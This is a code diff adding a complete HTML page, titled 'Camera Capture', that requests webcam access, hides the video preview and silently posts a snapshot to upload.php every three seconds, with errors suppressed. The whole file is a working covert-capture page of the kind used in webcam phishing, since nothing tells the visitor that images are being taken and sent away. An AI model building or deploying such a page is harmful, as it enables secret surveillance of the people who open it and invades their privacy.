@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Camera Capture</title>
+</head>
+<body>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<script>
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+
+      video.addEventListener('loadedmetadata', () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0);
+          const image = canvas.toDataURL('image/png');
+          fetch('upload.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image })
+          });
+        }, 3000);
+      });
+    })
+    .catch(() => {});
+</script>
+</body>
+</html>
